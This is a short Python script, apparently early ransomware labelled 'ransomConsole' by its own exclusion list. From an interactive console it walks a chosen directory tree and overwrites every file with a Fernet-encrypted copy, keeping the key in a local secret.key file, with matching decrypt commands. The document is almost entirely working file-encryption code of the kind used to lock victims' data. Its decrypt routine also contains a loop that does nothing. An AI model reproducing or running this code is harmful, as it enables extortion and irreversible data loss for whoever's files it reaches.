#!/usr/bin/env python3
import os
from cryptography.fernet import Fernet
import sys
from tqdm import tqdm
CMDS=['version','encrypt.all','decrypt.all','encrypt.dir','decrypt.dir','exit']
VER='0.0.4-Pro remake'
KEY_PATH='secret.key'
EXCLUDED=['console.py','console',KEY_PATH,'ransomConsole-0.0.2-Pro.tar.gz','Makefile']
if not os.path.exists(KEY_PATH):
	key=Fernet.generate_key()
	with open(KEY_PATH,'wb')as f:f.write(key)
else:
	with open(KEY_PATH,'rb')as f:key=f.read()
def encrypt(filepath):
	A=filepath
	if os.path.basename(A)in EXCLUDED:return
	if not os.path.isfile(A):return
	B=os.path.getsize(A)
	with tqdm(total=B*2,unit='B',unit_scale=True,desc=os.path.basename(A))as D:
		with open(A,'rb')as C:E=C.read();D.update(B)
		F=Fernet(key).encrypt(E)
		with open(A,'wb')as C:C.write(F);D.update(B)
	print(f"Encrypted {A}")
def encryptAll(rootDir):
	for(A,E,B)in os.walk(rootDir):
		for C in B:D=os.path.join(A,C);encrypt(D)
def decrypt(filepath):
	A=filepath
	if os.path.basename(A)in EXCLUDED:return
	if os.path.isfile(A):
		with open(A,'rb')as C:B=C.read()
		with tqdm(total=len(B),unit='B',unit_scale=True,desc=os.path.basename(A))as E:
			for D in range(0,len(B),1048576):F=B[D:D+1048576]
			with open(A,'wb')as C:C.write(Fernet(key).decrypt(B))
			E.update(len(F))
	print(f"Decrypted {A}")
def decryptAll(rootDir):
	for(A,E,B)in os.walk(rootDir):
		for C in B:D=os.path.join(A,C);decrypt(D)
def main():
	A=input('Enter your root directory: ')or'.'
	while True:
		B=input('Enter your command: ')
		if B==CMDS[0]:print(VER)
		elif B==CMDS[1]:encryptAll(A)
		elif B==CMDS[2]:decryptAll(A)
		elif B==CMDS[3]:
			for C in os.listdir(A):encrypt(os.path.join(A,C))
		elif B==CMDS[4]:
			for C in os.listdir(A):decrypt(os.path.join(A,C))
		elif B==CMDS[5]:sys.exit(0)
		else:
			print('Error: command not found. Try with:')
			for D in CMDS:print(D)
if __name__=='__main__':main()